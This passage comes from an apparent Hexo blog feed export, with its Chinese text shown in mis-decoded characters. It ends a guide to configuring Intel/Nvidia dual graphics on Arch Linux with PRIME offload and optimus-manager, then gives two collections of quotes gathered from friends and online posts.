<h2 id="è§£å†³æ–¹æ¡ˆ"><a href="#è§£å†³æ–¹æ¡ˆ" class="headerlink" title="è§£å†³æ–¹æ¡ˆ"></a>è§£å†³æ–¹æ¡ˆ</h2><h3 id="ä¿è¯æ˜¾å¡é©±åŠ¨æ­£å¸¸"><a href="#ä¿è¯æ˜¾å¡é©±åŠ¨æ­£å¸¸" class="headerlink" title="ä¿è¯æ˜¾å¡é©±åŠ¨æ­£å¸¸"></a>ä¿è¯æ˜¾å¡é©±åŠ¨æ­£å¸¸</h3><h4 id="Intelæ˜¾å¡é©±åŠ¨"><a href="#Intelæ˜¾å¡é©±åŠ¨" class="headerlink" title="Intelæ˜¾å¡é©±åŠ¨"></a>Intelæ˜¾å¡é©±åŠ¨</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo pacman -S mesa lib32-mesa</span><br></pre></td></tr></table></figure>

<p>å¦å¤–éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœä¹‹å‰å®‰è£…äº† <code>xf86-video-intel</code> åŒ…ï¼Œæœ€å¥½å¸è½½æ‰ã€‚å®˜æ–¹å·²ç»ä¸å»ºè®®ç»§ç»­ä½¿ç”¨æ­¤è½¯ä»¶åŒ…ã€‚</p>
<blockquote>
<p> Often not recommended, see note below</p>
<p><strong>Note:</strong> Some (<a href="https://www.phoronix.com/scan.php?page=news_item&px=Ubuntu-Debian-Abandon-Intel-DDX" target="_blank" rel="noopener">Debian &amp; Ubuntu</a>, <a href="https://www.phoronix.com/scan.php?page=news_item&px=Fedora-Xorg-Intel-DDX-Switch" target="_blank" rel="noopener">Fedora</a>, <a href="https://community.kde.org/Plasma/5.9_Errata#Intel_GPUs" target="_blank" rel="noopener">KDE</a>) recommend not installing the <a href="https://www.archlinux.org/packages/?name=xf86-video-intel" target="_blank" rel="noopener">xf86-video-intel</a> driver, and instead falling back on the modesetting driver for Gen4 and newer GPUs (GMA 3000 from 2006 and newer). See [<a href="https://web.archive.org/web/20160714232204/https://www.reddit.com/r/archlinux/comments/4cojj9/it_is_probably_time_to_ditch_xf86videointel/" target="_blank" rel="noopener">1]</a>, [<a href="https://www.phoronix.com/scan.php?page=article&item=intel-modesetting-2017&num=1" target="_blank" rel="noopener">2]</a>, <a href="https://wiki.archlinux.org/index.php/Xorg#Installation" target="_blank" rel="noopener">Xorg#Installation</a>, and <a href="https://jlk.fjfi.cvut.cz/arch/manpages/man/modesetting.4" target="_blank" rel="noopener">modesetting(4)</a>. However, the modesetting driver can cause problems such as <a href="https://bugs.chromium.org/p/chromium/issues/detail?id=370022" target="_blank" rel="noopener">Chromium Issue 370022</a>.</p>
</blockquote>
<p>å¸è½½æ–¹å¼ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo pacman -Rsc xf86-video-intel</span><br></pre></td></tr></table></figure>

<h4 id="Nvidiaæ˜¾å¡é©±åŠ¨"><a href="#Nvidiaæ˜¾å¡é©±åŠ¨" class="headerlink" title="Nvidiaæ˜¾å¡é©±åŠ¨"></a>Nvidiaæ˜¾å¡é©±åŠ¨</h4><p>å®‰è£… nvidia åŒ…ï¼Œä¸ºäº†å¯¹ 32 ä½ç¨‹åºçš„æ”¯æŒï¼Œå®‰è£… lib32-nvidia-utils åŒ… (ä½äº multilib ä»“åº“ï¼Œéœ€è¦åœ¨pacman configä¸­æå‰è‡ªè¡Œå¼€å¯æ­¤ä»“åº“)ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo pacman -S nvidia lib32-nvidia-utils</span><br></pre></td></tr></table></figure>

<h3 id="é…ç½®-PRIME-render-offload"><a href="#é…ç½®-PRIME-render-offload" class="headerlink" title="é…ç½® PRIME render offload"></a>é…ç½® PRIME render offload</h3><p>å®‰è£… <code>nvidia-prime</code> åŒ…æ¥ä½¿ç”¨å®˜æ–¹é…ç½®ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo pacman -S nvidia-prime</span><br></pre></td></tr></table></figure>

<p>é‡å¯ç³»ç»Ÿåå¯ä»¥ä½¿ç”¨ <code>prime-run</code> å‘½ä»¤ä½¿æŒ‡å®šç¨‹åºåœ¨Nå¡ä¸Šæ¸²æŸ“ã€‚ä¾‹å¦‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä»¥ n å¡æ¸²æŸ“ vlc</span></span><br><span class="line">$ prime-run vlc</span><br><span class="line"><span class="comment"># ä»¥ n å¡æ¸²æŸ“ wine æ¸¸æˆ</span></span><br><span class="line">$ prime-run wine touhou08.exe</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ä½¿ç”¨ <code>mesa-demo</code> åŒ…é‡Œçš„ <code>glxinfo</code> æŒ‡ä»¤æŸ¥çœ‹å½“å‰ä½¿ç”¨çš„æ˜¾å¡ã€‚</p>
<h3 id="ä½¿ç”¨Optimus-Manageré…ç½®åŒæ˜¾å¡"><a href="#ä½¿ç”¨Optimus-Manageré…ç½®åŒæ˜¾å¡" class="headerlink" title="ä½¿ç”¨Optimus Manageré…ç½®åŒæ˜¾å¡"></a>ä½¿ç”¨Optimus Manageré…ç½®åŒæ˜¾å¡</h3><p>æ­¤æ—¶HDMIè¿æ¥çš„æ˜¾ç¤ºå™¨å¯ä»¥æ­£å¸¸å·¥ä½œäº†ã€‚ä½†æ˜¯ç¬”ç”µè‡ªå¸¦çš„æ˜¾ç¤ºå™¨å¡åœ¨TTYï¼Œå¯èƒ½æ˜¯ç”±äºæ˜¾å¡ä¸å…¼å®¹çš„é—®é¢˜ã€‚æˆ‘é€‰æ‹©äº†ä½¿ç”¨Optimus Managerè¿›è¡ŒåŒæ˜¾å¡çš„é…ç½®ã€‚</p>
<h4 id="äº‹å‰å‡†å¤‡"><a href="#äº‹å‰å‡†å¤‡" class="headerlink" title="äº‹å‰å‡†å¤‡"></a>äº‹å‰å‡†å¤‡</h4><p>é¦–å…ˆæ¸…é™¤ï¼ˆå¤‡ä»½ï¼‰<code>/etc/X11/xorg.conf.d/</code> ä¸‹çš„é…ç½®æ–‡ä»¶, å¹¶åˆ æ‰ï¼ˆå¤‡ä»½ï¼‰<code>/etc/X11/xorg.conf</code>, å› ä¸ºOptimus Managerä¼šè‡ªåŠ¨ç”Ÿæˆé…ç½®æ–‡ä»¶å­˜æ”¾åˆ°<code>/etc/X11/xorg.conf.d/</code>é‡Œé¢, æ‰€ä»¥å»ºè®®å®‰è£…å‰æŠŠæ˜¾ç¤ºé…ç½®ç›¸å…³çš„æ–‡ä»¶éƒ½æ¸…é™¤æ‰ã€‚</p>
<h4 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h4><p>å®‰è£…Optimus ManageråŒ…ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Arch Linux CN</span></span><br><span class="line">$ sudo pacman -S optimus-manager</span><br><span class="line"><span class="comment"># AUR</span></span><br><span class="line">$ yay -S optimus-manager</span><br></pre></td></tr></table></figure>

<p>å¦‚æœä½ æ˜¯GDMç”¨æˆ·æˆ–è€…Manjaro KDE ç”¨æˆ·ï¼Œè¯·åŠ¡å¿…å‚è€ƒ<a href="https://github.com/Askannz/optimus-manager#important--gnome-and-gdm-users" target="_blank" rel="noopener">README</a>ä¸­çš„æ³¨æ„äº‹é¡¹ã€‚</p>
<h4 id="é…ç½®"><a href="#é…ç½®" class="headerlink" title="é…ç½®"></a>é…ç½®</h4><p>æ¥ä¸‹æ¥ä¿®æ”¹é…ç½®æ–‡ä»¶ã€‚å°† <code>/usr/share/</code> ç›®å½•ä¸‹çš„é…ç½®æ–‡ä»¶æ”¾åˆ° <code>/etc/optimus-manager/</code> ä¸‹è¿›è¡Œè®¾ç½®ã€‚å°†åˆ‡æ¢æ–¹å¼è®¾ä¸º<code>switching=none</code>, ä¸æ¨èä½¿ç”¨bbswitchï¼ˆå®¹æ˜“é‡åˆ°ACPIé”æ­»çš„é—®é¢˜, <a href="https://wiki.archlinux.org/index.php/NVIDIA_Optimus#Lockup_issue_(lspci_hangs)" target="_blank" rel="noopener">å‚è€ƒWiki</a>ï¼‰, è®¾ç½®<code>pci_power_control=yes</code>è®©PCI Power Managementåˆ‡æ¢æ˜¾å¡ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ sudo cp /usr/share/optimus-manager.conf /etc/optimus-manager/optimus-manager.conf</span><br><span class="line">$ sudo vim /etc/optimus-manager/optimus-manager.conf</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®å¼€æœºéœ€æ±‚è‡ªåŠ¨é€‰æ‹©æ˜¾å¡ã€‚</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">startup_mode=auto</span><br><span class="line">startup_auto_battery_mode=integrated</span><br><span class="line">startup_auto_extpower_mode=nvidia</span><br></pre></td></tr></table></figure>

<p>ä¸Šè¿°é…ç½®è®¾ç½®äº†å¼€æœºæ—¶é€‰æ‹©ä½¿ç”¨çš„æ˜¾å¡ã€‚ç”µæ± æ¨¡å¼ä½¿ç”¨äº†é›†æ˜¾ï¼Œè€Œå……ç”µæ—¶ä½¿ç”¨ç‹¬æ˜¾ã€‚Rebootä¹‹ååŒæ˜¾å¡æ˜¾ç¤ºæ­£å¸¸ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨ <code>nvidia-settings</code> å¯¹åŒæ˜¾ç¤ºå™¨çš„æ˜¾ç¤ºæƒ…å†µè¿›è¡Œè®¾ç½®ã€‚è§£å†³äº†ä¹‹å‰çš„â€œlaggyâ€å’Œâ€œtearingâ€çš„æƒ…å†µã€‚</p>
<h4 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ optimus-manager --switch nvidia <span class="comment">#åˆ‡æ¢åˆ°nvidiaæ˜¾å¡</span></span><br><span class="line">$ optimus-manager --switch integrated <span class="comment">#åˆ‡æ¢åˆ°é›†æ˜¾</span></span><br></pre></td></tr></table></figure>

<p>æ³¨æ„ï¼š</p>
<ul>
<li>åˆ‡æ¢æ˜¾å¡çš„è¿‡ç¨‹ä¸­ä¼šè‡ªåŠ¨æ³¨é”€ç™»å½•, æ‰€ä»¥è®°å¾—<strong>ä¿å­˜å¹¶å…³æ‰ç”µè„‘æ­£åœ¨è¿è¡Œçš„ç¨‹åº</strong>ã€‚</li>
<li>ä½ å¯ä»¥åœ¨é…ç½®æ–‡ä»¶ä¸­ä¿®æ”¹<code>auto_logout=false</code>ç¦æ­¢è‡ªåŠ¨æ³¨é”€ä»¥æ‰‹åŠ¨æ³¨é”€åˆ‡æ¢æ˜¾å¡ã€‚</li>
</ul>
<h2 id="å…¶å®ƒ"><a href="#å…¶å®ƒ" class="headerlink" title="å…¶å®ƒ"></a>å…¶å®ƒ</h2><p>grubåœ¨å“ªå—å±å¹•ä¸Šæ˜¾ç¤ºçš„é—®é¢˜ï¼Œä¹‹åè¡¥å……ã€‚</p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ol>
<li><a href="https://blog.sakuya.love/archives/linuxgpu/" target="_blank" rel="noopener">https://blog.sakuya.love/archives/linuxgpu/</a></li>
<li><a href="https://blog.starry-s.me/posts/archlinux-pavilion-gaming-laptop/" target="_blank" rel="noopener">https://blog.starry-s.me/posts/archlinux-pavilion-gaming-laptop/</a></li>
<li><a href="https://wiki.archlinux.org/index.php/NVIDIA" target="_blank" rel="noopener">https://wiki.archlinux.org/index.php/NVIDIA</a></li>
</ol>
]]></content>
      <categories>
        <category>ç³»ç»Ÿ</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>æ˜¾å¡</tag>
      </tags>
  </entry>
  <entry>
    <title>å¦™è¯­é›†II</title>
    <url>/2020/10/24/%E5%A6%99%E8%AF%AD%E9%9B%86II/</url>
    <content><![CDATA[<p>å‘¨å›´äººä»¬æœ‰è¶£è¨€è®ºçš„ç¢ç‰‡é›†åˆã€‚ç¬¬äºŒè¾‘ã€‚</p>
<a id="more"></a>

<ul>
<li>ä½ é—®æˆ‘æˆ‘ä¹Ÿè¦ç™¾åº¦çš„å•Šã€‚</li>
</ul>
<div style="text-align: right"><i>by zkonge@QQ</i></div><hr/>

<ul>
<li>è¿˜æ˜¯è¦å£°æ˜å®éªŒç­åŒ…æ‹¬è¥¿ç”µå¥½ä¸å¥½å’Œä½ å¼ºå¼±æ²¡ä»€ä¹ˆå…³ç³»ã€‚</li>
</ul>
<div style="text-align: right"><i>by sad@QQ</i></div><hr/>

<ul>
<li>æ‰€è°“çš„å„¿ç«¥å‘çš„å†…å®¹æ˜¯æŒ‡ï¼Œå¤§äººä»¬å°†è‡ªå·±è§‰å¾—éå¸¸é…·çš„å†…å®¹ï¼Œç”¨å®¹æ˜“ç†è§£çš„æ–¹å¼ä¼ è¾¾ç»™å­©å­ä»¬çš„åˆ›ä½œå†…å®¹ã€‚è€Œæ‰€è°“çš„éª—å°å­©å­çš„å†…å®¹æ˜¯æŒ‡ï¼Œå¤§äººä»¬è‡ªå·±éƒ½ä¸å¤ªå–œæ¬¢ï¼Œä½†æ˜¯ä¼°è®¡å­©å­ä»¬ä¼šå–œæ¬¢ï¼Œä»¥æ­¤æ ‡å‡†è¿›è¡Œæ¨æµ‹è€Œåšå‡ºæ¥çš„å†…å®¹ã€‚</li>
</ul>
<div style="text-align: right"><i>by kiwaPW@twitter</i></div><hr/>

<ul>
<li>ä½ ä¸å­¦å’‹çŸ¥é“ä½ ä¸ä¼šå†™å˜›ã€‚</li>
</ul>
<div style="text-align: right"><i>by zkonge@QQ</i></div><hr/>

<ul>
<li>å°‘piè¯ï¼Œè¿‡åº¦çš„è°¦è™šä¸æ˜¯ç¾å¾·ã€‚</li>
</ul>
<div style="text-align: right"><i>by æ§@QQ</i></div><hr/>

<ul>
<li>å¦‚ä½•å‡å°‘ç”Ÿæ´»ä¸­çš„éš¾è¿‡å¹¶ä½¿è‡ªå·±å¼‚å¸¸å¹³ç¨³:<br>1.ä¸ä¸»åŠ¨è§†å¥¸<br>2.æ§åˆ¶ä¸äº†å°±åˆ é™¤/æ‹‰é»‘<br>3.å°‘è¯´è¯,å¤šå¬å¤šåŠ¨è„‘æ€è€ƒ<br>4.å‡¡äº‹æœ‰å¿…è¦åªè§£é‡Šä¸€æ¬¡ï¼Œä¿¡å°±ä¿¡ä¸ä¿¡å°±æ»š<br>5.å¤šçœ‹ä¹¦é™ä¸ä¸‹å¿ƒå°±çœ‹ç”µå½±ï¼Œä¸çœ‹ç½‘ç»œæ–‡å­¦ä¸ä¿¡é¸¡æ±¤<br>6.ä¸è¦è¿‡å¤šåœ¨æ„ä»–äººçš„ç›®å…‰<br>7.ä¸è¦å¤šæƒ³ï¼Œå­¦ä¼šåŸè°…è‡ªå·±å¼€å¿ƒæœ€é‡è¦<br>8.åšä¸åˆ°æŒ‰æ—¶ç¡è§‰,è‡³å°‘è¦åšåˆ°é¥­ç‚¹åƒé¥­<br>9.ç¤¾äº¤è½¯ä»¶æ§åˆ¶åœ¨1-3ä¸ªå†…ï¼Œä¸è¦å› ä¸ºæ— èŠè€Œç¤¾äº¤<br>10.è®©è‡ªå·±éš¾è¿‡çš„äº‹ï¼Œå‘æ³„ä¸€æ¬¡å°±åˆ°æ­¤ä¸ºæ­¢</li>
</ul>
<div style="text-align: right"><i>by Uch1haOb1to@weibo</i></div><hr/>

<ul>
<li>è°ƒvå‡ å¹´äº†â€¦åˆäºŒå§..æŒºä¹…äº†,ä¹Ÿæ²¡å•¥èƒ½å¼•ä»¥ä¸ºè±ªçš„ã€‚<br>å…¶å®æˆ‘è¡¨é¢æŒºå¿«ä¹,ä½†æˆ‘ä¸€å†æ€€ç–‘è‡ªå·±æ˜¯å¦çœŸçš„åšäº†æ­£ç¡®é€‰æ‹©ã€‚çœ‹åˆ°åé¢çš„äººä¸€ä¸ªä¸ªè¶…è¿‡æˆ‘,é‚£ç§æŒ«è´¥æ„Ÿæˆ‘åœ¨ç†Ÿæ‚‰ä¸è¿‡ã€‚ä¸è¿‡å›å¿µä¸€æƒ³æœ¬æ¥æˆ‘å°±æ˜¯å…´è¶£ä½¿ç„¶æ‰é€‰æ‹©äº† Vocaloid,å› ä¸ºå®ƒæœ‰è¶£,å®ƒå°ä¼—,å½“ç„¶ä¹Ÿèƒ½æ‰¾åˆ°æœ‹å‹ã€‚<br>ç›´åˆ°ä»Šå¤©æˆ‘è‡ªå·±æ‰å¯èƒ½æƒ³é€šäº†,æ—äººçš„æˆåŠŸä¹Ÿå¥½,ä¸æˆ‘æœ‰ä½•å…³ç³»ã€‚æˆ‘æ‰€æœ€åº”è¯¥åšçš„æ˜¯äº«å—è°ƒvçš„è¿‡ç¨‹ç½¢äº†ã€‚æˆ‘è¿·èŒ«çš„æœ€å¤§åŸå› åªæ˜¯å«‰å¦’çš„ä½œç¥Ÿã€‚æˆ‘è¦åšçš„äº‹æƒ…è¿˜å¾ˆå¤š,å¹¶ä¸åº”è¯¥è®© Vocaloidæˆä¸ºæˆ‘çš„å¿ƒç»“,å¿™èµ·æ¥è‡ªç„¶ä¹Ÿå°±ä¸ä¼šæƒ³é‚£ä¹ˆå¤šäº†å§ã€‚<br>æˆ‘è§‰å¾—æˆ‘è¿˜æ˜¯ä¼šéµå®ˆæˆ‘æ›¾ç»çš„æƒ³æ³•:<br>å…´è¶£ä½¿ç„¶,åœˆå†…é€æ˜ã€‚</li>
</ul>
<div style="text-align: right"><i>by Pr0crastHErtz@QQ</i></div><hr/>

<ul>
<li>ç½‘ç»œæš´åŠ›æ¯å¤©éƒ½åœ¨å‘ç”Ÿï¼Œä½†åªè¦ä½ ä¸æ˜¯è¢«æš´åŠ›çš„å½“äº‹äººï¼Œå¥½åƒå°±æ²¡æœ‰äººå…³å¿ƒè¢«æš´åŠ›è€…çš„çœŸå®ç”Ÿæ´»ç©¶ç«Ÿé­é‡äº†ä»€ä¹ˆã€‚<br>æœ‰äººè¯´äº’è”ç½‘æ˜¯å¦ä¸€ä¸ªä¸–ç•Œï¼Œå®ƒè„±ç¦»ç°å®æ˜¯é‚£ä¹ˆçš„è™šå¹»ä¸è‡ªç”±ï¼Œè‡ªç”±åˆ°æˆ‘ä»¬å¯ä»¥ä¸åŠ ä»»ä½•éšè—çš„è¡¨è¾¾è‡ªå·±çš„è§‚ç‚¹ã€‚æ¯ä¸ªå‘è¡¨è¨€è®ºçš„äººéƒ½è§‰å¾—è‡ªå·±çš„ä¸€å¥è¯æ— è¶³è½»é‡ï¼Œä½†æ— æ•°è‡ªä»¥ä¸ºæ˜¯çš„æ­£ä¹‰æ„Ÿèšåœ¨ä¸€èµ·ï¼Œå¯èƒ½å°±ä¼šè½»æ˜“å¤ºèµ°äººçš„ç”Ÿå‘½ã€‚<br>å³ä½¿çœŸçš„é€ æˆäº†ä¸å¥½çš„åæœï¼Œä½†ä¹Ÿæ²¡æœ‰äººè®¤ä¸ºè‡ªå·±æœ‰ä»€ä¹ˆé”™ï¼Œæœ€å¤šå”å˜˜å‡ å£°ï¼Œå˜æˆèŒ¶ä½™é¥­åçš„è°ˆèµ„ï¼Œç„¶åå°±åƒä¸€ä¸ªå¾ªç¯ï¼Œç»§ç»­è½¬ç§»åˆ°æ–°çš„äº‹ä»¶é‡Œã€‚<br>ç½‘ç»œä¸–ç•Œæ˜¯å…¬å¹³çš„ï¼Œæ¯ä¸ªäººéƒ½æœ‰å¯èƒ½æˆä¸ºæ–½æš´è€…ï¼Œä¹Ÿæœ‰å¯èƒ½æˆä¸ºå—å®³è€…ã€‚ä½ æ°¸è¿œä¸çŸ¥é“ä¸‹ä¸€ä¸ªè¢«å›´æ”»çš„äººæ˜¯ä¸æ˜¯ä½ ã€‚<br>â€œå·±æ‰€ä¸æ¬²ï¼Œå‹¿æ–½äºäººã€‚â€</li>
</ul>
<div style="text-align: right"><i>by æˆ‘æ°¸è¿œå–œæ¬¢æµ·æ£ é›¶@å“”å’”æ¼«ç”»</i></div><hr/>

<ul>
<li>æ€»æ„Ÿè§‰æŸäº›å¹³å°æœ‰ç€ç±»ä¼¼çš„æ°”è´¨,æœ‰çš„æ˜¯å¼€æºç¤¾åŒº,æœ‰çš„æ˜¯æ–‡é’èšé›†åœ°,æœ‰çš„æ˜¯ç¡¬æ ¸ç©å®¶ç¾¤ä½“ã€‚å›å¤´æƒ³æƒ³ä»–ä»¬éƒ½æœ‰ä¸€ä¸ªå…±åŒç‚¹,å°±æ˜¯æ„¿æ„å¼€çœ¼çœ‹ä¸–ç•Œã€‚</li>
</ul>
<div style="text-align: right"><i>by å‚æœ¬@twitter</i></div><hr/>

<ul>
<li>æ¯å¤©é€²æ­¥çš„æ–¹å¼<br>å°±æ˜¯æ—©ä¸Šé†’ä¾†æ™‚å‘Šè¨´è‡ªå·±ã€Œæˆ‘å°±çˆ›ã€<br>å°±èƒ½è¬™è™›åœ°é¢å°è‡ªèº«çš„æ¸ºå°åŠå­¸å•çš„æµ©ç€š<br>Yes we suck.</li>
</ul>
<div style="text-align: right"><i>by æ³°è¿ªTED-E@bilibili</i></div><hr/>

<ul>
<li>ä¸€äº›çµæ„Ÿè™½ç„¶è®°å½•åœ¨äº†çº¸ä¸Šï¼Œä½†ä¹Ÿæ˜¯æœ‰ä¿è´¨æœŸçš„ï¼Œæ‰€ä»¥å¾—åŠ ç´§å»å®Œæˆã€‚å‘ç°æ— è®ºå¦‚ä½•ä¹Ÿæ— æ³•å®Œæˆçš„ï¼Œç¼©å‡ä½“è£ä¹Ÿå¥½ï¼Œåˆä½œä¹Ÿå¥½ï¼Œåªè¦ä¿ç•™ä½ä¸»é¢˜æ€æƒ³ï¼Œä»ç„¶æ˜¯çµæ„Ÿå®Œç¾çš„ä½“ç°ã€‚<br>ä½†æ˜¯ä¸€æ—¦çœ‹ä¸æ‡‚çµæ„Ÿäº†ï¼Œæ— æ³•ç†è§£å½“æ—¶ä¸ºä»€ä¹ˆè¿™æ ·å†™äº†ï¼Œä¸æ˜ç™½ä¸ºä»€ä¹ˆä¼šè®°ä¸‹è¿™ä¹ˆå¹¼ç¨šçš„ä¸œè¥¿ï¼Œç”šè‡³æœ‰æ‚–äºè‡ªå·±ç°å­˜çš„ä»·å€¼è§‚äº†ï¼Œè¿™æ ·ä¸€æ¡çµæ„Ÿä¾¿ç»ˆæœ«äº†ã€‚é™¤äº†æœ‰å†™åœ¨çº¸ä¸Šçš„æ„ä¹‰ï¼Œä¸å†è¢«ä»»ä½•äººå‘ç°ï¼Œéšæ—¶é—´æ¶ˆäº¡ã€‚<br>è¿™æ ·çš„æ„Ÿè§‰æ˜¯å¾ˆç—›è‹¦çš„ï¼Œæ„Ÿåˆ°çš„å¹¼ç¨šä¸å›é¡¾è¿‡å»çš„ä½œå“æ„Ÿåˆ°çš„å¹¼ç¨šæˆªç„¶ä¸åŒï¼Œæ›´å¤šçš„æ˜¯ä¸€ç§æ— åŠ›æŒ½å›çš„æ‚²ä¼¤ã€‚</li>
</ul>
<div style="text-align: right"><i>by è·æ—@QQ</i></div><hr/>

<ul>
<li><p>ä¸åŠä½ ä»¬çœ‹çˆ½æ–‡ï¼Œæ—¢ç„¶å‘åœ¨åŒ¿åç‰ˆæˆ‘ä¹Ÿä¸æ‰“å¹¿å‘Šã€‚å¥½å¥½çœ‹ç‚¹ä¸¥è‚ƒä¸œè¥¿æ­¦è£…ä¸€ä¸‹è‡ªå·±å§è‚¥å“¥ä»¬ï¼Œçˆ½æ–‡æ¥è§¦å¤šäº†äººä¼šå‚»æ‰çš„ï¼Œè™½ç„¶è¿™ä¹ˆè¯´å¯¹ä¸èµ·è¡£é£Ÿçˆ¶æ¯ï¼Œä½†æ˜¯å†™çˆ½æ–‡ç»™äººçœ‹æ€»è§‰å¾—åƒåœ¨æ€çŒªã€‚æˆ‘æ²¡æŸäº›ç½‘æ–‡ä½œå®¶é‚£ä¹ˆä¸è¦è„¸ï¼Œä¸ä¼šä¿¡èª“æ—¦æ—¦åœ°è¯´è‡ªå·±å†™çš„ä¸œè¥¿ä¹Ÿç®—æ–‡å­¦ã€‚å”‰æ€»ä¹‹å¾ˆçŸ›ç›¾ï¼ŒçŸ¥é“è‡ªå·±å†™çš„ç‹—å±ä¸é€šï¼Œè®©è€å¸ˆçŸ¥é“äº†ä¼šéª‚æ­»æˆ‘çš„ï¼Œä½†æ˜¯æŒ£å¾—ç¡®å®ä¸å°‘ã€‚</p>
<div style="text-align: right"><i>by DXvbvaM@adnmb</i></div><hr/></li>
<li><p>æ›´ä½•å†µåˆ›ä½œè€…å•Šï¼Œä½ åœ¨åˆ›ä½œï¼Œå°±å·²ç»æ¯”ç™¾åˆ†ä¹‹ä¹åä¹çš„äººå‰å®³äº†ï¼Œä½ æœ‰è‡ªå·±çš„ä¸–ç•Œå•Šï¼Œä½ è¿™èˆ¬è´¬ä½è‡ªå·±å’Œè‡ªå·±çš„ä½œå“ï¼Œå®é™…ä¸Šæ˜¯ä¸€ç§å¯æ¶çš„å‚²æ…¢å•Šã€‚æ­£å¦‚æ®·å®çš„äººæ•´å¤©æŠ±æ€¨è‡ªå·±è´«ç©·å’Œä¸å¹¸ï¼Œä¸æ»¡è¶³æ˜¯å¥½äº‹ï¼Œä½†ä¸è¦æŠŠå·²æœ‰çš„è¯´æˆä¸€æ–‡ä¸å€¼ã€‚<br>ä¸è¦æ·±é™·åœ¨è¿½é€ç—›è‹¦çš„é“è·¯ä¸Šï¼<br>è‡ªå‹‰ã€‚</p>
<div style="text-align: right"><i>by å¤ç–«åå››@QQ</i></div><hr/></li>
<li><p>è¯·é‡è§†ç®—æ³•å¯¼è®ºå’Œæ•°æ®ç»“æ„è¿™ç§è¶…çº§æ— èŠåˆä¸ç›´æ¥å¢åŠ ç”Ÿäº§åŠ›çš„ä¹¦ã€åŒæ—¶æ›´è¦é‡è§†çº¿æ€§ä»£æ•°å’Œæ¦‚ç‡è®ºè¿™ç§çœ‹èµ·æ¥â€œä¸ç°å®è„±èŠ‚â€çš„ç§‘ç›®ï¼Œè¿™äº›æ— èŠç›´æ¥å†³å®šäº†ä½ è¯»æ–‡ç« çš„ä¸Šé™â€¦è¿™æ˜¯æˆ‘æœ€è¿‘åœ¨ä½¿ç”¨ Jupyter Notebookæ—¶ä½“ä¼šåˆ°çš„ï¼ˆ<br>by unknown@zhihu</p>
<div style="text-align: right"><i>by unknown@zhihu</i></div><hr/></li>
<li><p>Re: è„šæœ¬å°å­ï¼Ÿ<br>æˆ‘ä¹Ÿæ˜¯è¿™ä¹ˆæƒ³çš„ï¼Œä½†æ˜¯ä¸€æƒ³æˆ‘ä¹Ÿæ˜¯ï¼Œæˆ‘å°±é—­å˜´äº†ã€‚</p>
<div style="text-align: right"><i>by luoqian@QQ</i></div></li>
</ul>
]]></content>
      <categories>
        <category>æ‚ å“‰æ—¥å¸¸</category>
      </categories>
      <tags>
        <tag>å¦™è¯­é›†</tag>
      </tags>
  </entry>
  <entry>
    <title>å¦™è¯­é›†I</title>
    <url>/2020/10/24/%E5%A6%99%E8%AF%AD%E9%9B%86I/</url>
    <content><![CDATA[<p>å‘¨å›´äººä»¬æœ‰è¶£è¨€è®ºçš„ç¢ç‰‡é›†åˆã€‚ç¬¬ä¸€è¾‘ã€‚</p>
<a id="more"></a>

<ul>
<li>å¦‚æœè€ƒè™‘å¯¿å‘½çš„è¯â€¦<br>å®é™…ä¸ŠæŠŠè¿‡åº¦æŠ˜è…¾çš„æ—¶é—´èŠ‚çœä¸‹æ¥ï¼Œç”¨æ¥å­¦ä¹ å·¥ä½œã€‚æ‰€èƒ½å¾—åˆ°çš„æ”¶ç›Šå¦‚æœç”¨è´§å¸æ¥è¡¡é‡ã€‚æˆ‘è§‰å¾—ç”šè‡³æœ‰è¶³å¤Ÿä½ å†ä¹°ä¸æ­¢ä¸€ä¸ªç¡¬ç›˜äº†â€¦</li>
</ul>
<div style="text-align: right"><i>by JimMoen@Archlinuxcn</i></div>

<hr/>

<ul>
<li><p>æœ‰åˆç†åé¦ˆèƒ½åŠ›çš„ç™½è€é¼ æ‰æœ‰ç”¨ï¼Œåƒäº†æ¯’è¯å°±æ­»äº†æˆ–è€…è·‘æ‰çš„ç™½è€é¼ æ— ç”¨ã€‚</p>
<div style="text-align: right"><i>by oldherl@Archlinuxcn</i></div></li>
</ul>
<hr/>

<ul>
<li><p>ç°åœ¨è¿™æ ·è¯´æœ‰ç‚¹é™ˆè¯æ»¥è°ƒï¼Œä½†å› ä¸ºæˆ‘ä»¬ä¸ä¸ºä½¿ç”¨è¿™äº›äº§å“ä»˜é’±ï¼Œå¹¿å‘Šå•†ä¸ºæˆ‘ä»¬ä½¿ç”¨çš„äº§å“ä»˜é’±ï¼Œå¹¿å‘Šå•†æ˜¯é¡¾å®¢ï¼Œæˆ‘ä»¬æ˜¯è¢«é”€å”®çš„å•†å“ã€‚ç»å…¸çš„è¯´æ³•æ˜¯ï¼Œâ€œå¦‚æœä½ æ²¡æœ‰èŠ±é’±ä¹°äº§å“ï¼Œé‚£ä½ å°±æ˜¯è¢«å–çš„äº§å“â€ã€‚</p>
<div style="text-align: right"><i>by unknown@acfun</i></div></li>
</ul>
<hr/>

<ul>
